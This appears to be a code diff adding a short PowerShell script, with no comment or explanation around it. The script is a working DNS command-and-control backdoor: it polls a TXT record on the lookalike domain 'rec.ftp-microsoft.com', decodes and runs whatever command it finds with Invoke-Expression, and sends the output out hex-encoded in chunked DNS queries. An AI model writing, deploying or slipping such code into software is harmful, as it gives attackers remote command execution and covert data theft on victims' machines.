@@ -1,0 +1,34 @@
+$previousPelet = $null
+$chunkSize = 60
+$dnsServer = ""
+$dnsRecord = "rec.ftp-microsoft.com"
+$sleepInterval = "0.5"
+while ($true) {
+    Start-Sleep -Seconds $sleepInterval
+    $pkuda = (Resolve-DnsName -type TXT $dnsRecord)[0] | Select -ExpandProperty "Strings"
+    $pelet = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($pkuda))
+    if ($pelet -ne $previousPelet) {
+        $previousPelet = $pelet
+        $commandOutput = Invoke-Expression $pelet
+        $outputLines = $commandOutput -split "`n"
+        $lineIndex = 0
+        foreach ($line in $outputLines) {
+            $hexEncodedLine = -join ($line.ToCharArray() | ForEach-Object {
+                [Convert]::ToString([Byte][Char]$_, 16).PadLeft(2, '0')
+            })
+            $textLength = $hexEncodedLine.Length
+            $index = 0
+            while ($index * $chunkSize -lt $textLength) {
+                $from = $index * $chunkSize
+                $currentChunkSize = [Math]::Min($chunkSize, $textLength - $from)
+                $currentChunk = $hexEncodedLine.Substring($from, $currentChunkSize)
+                $query = "$currentChunk.$lineIndex.$index.$dnsServer"
+                Write-Output "Query: $query"
+                Resolve-DnsName -Name $query -Type TXT
+                Start-Sleep -Milliseconds 100
+                $index++
+            }
+            $lineIndex++
+        }
+    }
+}
